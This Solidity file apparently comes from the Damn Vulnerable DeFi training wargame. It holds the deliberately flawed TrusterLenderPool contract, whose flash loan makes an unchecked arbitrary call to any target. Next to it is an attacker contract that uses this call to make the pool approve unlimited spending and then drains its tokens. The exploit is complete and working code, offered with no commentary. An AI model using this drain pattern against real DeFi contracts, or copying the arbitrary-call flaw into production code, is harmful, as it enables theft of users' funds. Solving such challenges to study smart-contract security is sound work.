// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

contract TrusterLenderPoolAttacker {
    TrusterLenderPool public victim;
    DamnValuableToken public token;

    constructor(address _addr, address _taddr) {
        victim = TrusterLenderPool(_addr);
        token = DamnValuableToken(_taddr);
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        victim.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(victim), msg.sender, 100_0000 ether);
    }
}
